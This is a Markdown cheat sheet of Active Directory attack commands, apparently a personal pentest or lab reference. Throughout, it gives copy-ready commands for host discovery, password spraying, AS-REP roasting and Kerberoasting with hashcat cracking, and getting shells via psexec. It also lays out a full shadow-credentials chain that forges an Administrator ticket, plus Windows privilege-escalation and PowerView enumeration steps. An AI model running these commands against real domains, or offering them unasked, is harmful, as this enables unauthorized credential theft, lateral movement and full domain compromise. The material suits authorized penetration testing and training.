### Active Directory

### From Linux

#### AD Strategy
1. Start with nmap, to idenftiy the network.
2. Assume Breach strategy
3.    1. Get user, groups, computers

#### How to identify alive hosts in netowrk ?
1. Run nmap ping sweep, Command: `nmap -r -sn 192.168.110.0/24`
2. Run nmap ping sweep, Command: `nmap -r -sP 192.168.110.0/24` 

#### How to identify Domain Controller (DC) ?
1. Most probably a DC would be having open PORTS e.g 53 and **88 (KDC)**, 389, 636 which are not avbl to other Windows machines.
2. If you're in DC network, Command: `nmap -r -v --open -sC -sV -p53,88,389,636 <DC IP>`
3. If above command shows these ports **OPEN** ... You got **DC** !!!

#### How to extract the underlying Windows OS via crackmapexec?
1. Command: `proxychains crackmapexec smb -d somedomain.htb -u user -p 'password' -dc-ip 192.168.110.52-55`

#### How to Generate username combinations ?
1. Use https://github.com/urbanadventurer/username-anarchy

#### How to know that username/password combination is valid - crakmapexec ?
1. If running follwing crackmapexec command against **DC** gives you **+** symbol, the **creds** are valid.
2. Command:  `proxychains crackmapexec smb -d somedomain.htb -u user -p 'password' -dc-ip 192.168.110.55`

#### How to know that username/password combination is valid - kerbrute (password spray) ?
1. Command: `./kerbrute_linux_amd64 passwordspray --dc 192.168.110.55 -d somedomain.htb AD_users.txt 'password'`
2. Command: `./kerbrute_linux_amd64 -d internal.abc.local passwordspray allUsers.txt 'Password100!' --dc 192.168.210.16'`
   
##### Using impacket - To find all the usernames, email address etc?
1. Without username/password command: `proxychains GetADUsers.py somedomain.htb/ -no-pass -dc-ip 192.168.110.55`
2. With user/password of a valid domain user command: `proxychains GetADUsers.py somedomain.htb/ -no-pass -all -dc-ip 192.168.110.55`

##### Using impacket - Authentication Service Response (AS-REP) Roasting?
1. Highly unlikely today, as by default, in **Active Directory**, it is more likely the feature that **enables** this attack is **disabled**.
2. When DC Admin creates a user in DC, he has to explictly check option **Do not require Kerberos Pre-Authentication**.
3. Commamd: `proxychains GetNPUsers.py somedomain.htb/ -dc-ip 192.168.110.55 -usersfile ALL_AD_users.txt -format hashcat`
4. Command: `proxychains GetNPUsers.py somedomain.htb/someuser:'password' -dc-ip 192.168.110.55 -usersfile ALL_AD_users.txt -format hashcat`
5. If above command shows, *User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set*, this means, it doesn't work for this user. 
6. Crack the hashes, by running command: `hashcat -a 0 -m 18200 asrep-roast-hash.txt rockyou.txt`

##### Using impacket - Kerberoasting?
1. To get hashes, run command: `proxychains GetUserSPNs.py somedomain.htb/someuser:'password' -dc-ip 192.168.110.55 -request`
2. Cracking hashes: `hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt`

##### What to do if you have got valid user/password credentials --- after as-rep/kerb roasting ?
1. Lets assume Kerberoasting got successful, what to do next ?
2. Run cracmapexec, and if shows **Pwn3d!**, this means you can access that particular system.
3. Command: `proxychains crackmapexec smb 192.168.110.52-55 -u http_svc -p 'somepassword'`

##### Listing all the shares - crackmapexec ?
1. Command: `proxychains crackmapexec smb 192.168.110.52 -u http_svc -p 'somepassword' --shares`

##### Accessing that system e.g. we got creds after kerberoasting ?
1. Via psexec, command: `proxychains impacket-psexec somedomain.htb/http_svc:'somepassword'@192.168.110.52`
2. The above command would you give you shell. 

#### After shell, use SYSINTERNALS AD Explorer  / Bloodhound
1. Remote Blooudhound from Kali, command: `proxychains bloodhound-python --zip -c all -d somedomain.local -u marcus -p 'Password100!' --dns-tcp -ns <DC IP address>`

#### Useful commands - Assume Breach Appraoch - You're inside the DC network with valid user/pass combination
1. **Local vs Domain** - This command tells all the users present in the current system. Command: `net user` or `net user <username>`
3. **Local vs Domain** - This command tells all the users present in all the DC. Command: `net user /domain` or `net user <username>  /domain `

#### AD Abuse - AddKeyCredentialLink [pywhisker.py -> gettgtpkinit.py - > getnthash.py -> impacket-lookupsid -> impacket-ticketer -> finally psexec / secretsdump)
1. `proxychains python3 pywhisker.py -d "somedomain.local" -u 'username' -p 'Password100'  --target "COMP-ABC-1$" --action "list"`
2. `proxychains python3 pywhisker.py -d "somedomain.local" -u 'username' -p 'Password100'  --target "COMP-ABC-1$" --action "add" --filename hacker`
3. `proxychains python3 gettgtpkinit.py -cert-pfx "hacker.pfx" -pfx-pass "VSDR4fkJazANDrGfis03" "somedomain.local/COMP-ABC-1\$" out.cache`
4. `proxychains python3 getnthash.py somedomain.local/COMP-ABC-1\$ -key bc39f3e57c5550412fbedd1430c3919f1f25f0a67117517242422029241d1c85`
5. `proxychains impacket-lookupsid somedomain.local/username@192.168.210.10(DC) | grep "Domain SID"`
6. `proxychains impacket-ticketer -nthash 89d0b56874f61ad38bad336a77b8ef2f -domain somedomain.local -domain-sid S-1-5-21-2734290894-461713716-141835440 Administrator -dc-ip 192.168.210.10(DC)`
7. `export KRB5CCNAME=Administrator.ccache`
8. `klist`
9. `impacket-psexec somedomain.local/Administrator@192.168.210.10 -target-ip 192.168.210.11(ADComputer) -dc-ip 192.168.210.10(DC) -no-pass -k`


### From Windows

#### PrivEsc in Windows
1. Vulnerablities in installed software our outdated OS or missing patches.
2. AutoLogON Passwords in Cleartext.
3. AlwaysInstallElevated.
4. Misconfigured Services. (Unquoted path etc.) 
5. DLL Hijacking.
6. NTLM relaying.
7. Local services running (chisel).
8. Tools: PowerUP + PrivESC + WinPEAS

#### Enumeration after importing Powerview
1. `Get-NetDomain` #Net domain details
2. `Get-NetForset` #Net forest details
3.  Run DomainPasswordSpray powershell script to list all the user accounts txt
5. `Get-DomainComputer | select samaccountname,operatingsystem` #find OS details
6. `Get-NetDomainController`
7. `Get-NetUser`
8. `Get-NetGroupMember -Identity "Enterprise Admins" -Domain  moneycorp.local` #Find enterprise admin, which is accessible on root only
9. `Get-DomainComputer -TrustedToAuth` #Looking for constrained delegation abuse (Look for attribute msDS-AllowedToDelegateTo)
10. `Get-DomainUser -TrustedToAuth` #Looking for constrained delegation abuse (msDS-AllowedToDelegateTo)
11. `Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto` #Looking for constrained delegation abuse
12. `Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto` #Looking for constrained delegation abuse
   
#### PrivESC after importing Powerup
1. `Invoke-Allchecks`


#### AD Pentesting Tools
1. Obviously neo4j and bloodhound or powerhound
2. plumhound
3. adminer
